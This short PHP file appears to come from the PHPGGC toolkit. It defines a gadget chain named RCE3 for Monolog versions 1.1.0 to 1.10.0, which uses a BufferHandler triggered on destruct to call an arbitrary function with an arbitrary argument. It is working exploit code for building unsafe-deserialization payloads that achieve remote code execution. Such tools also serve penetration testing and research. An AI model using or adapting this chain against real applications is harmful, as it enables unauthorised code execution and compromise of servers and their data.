<?php

namespace GadgetChain\Monolog;

class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.1.0 <= 1.10.0';
    public static $vector = '__destruct';
    public static $author = 'theBumble';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\BufferHandler(
                ['current', $function],
                [$parameter, 'level' => null]
        );
    }
}
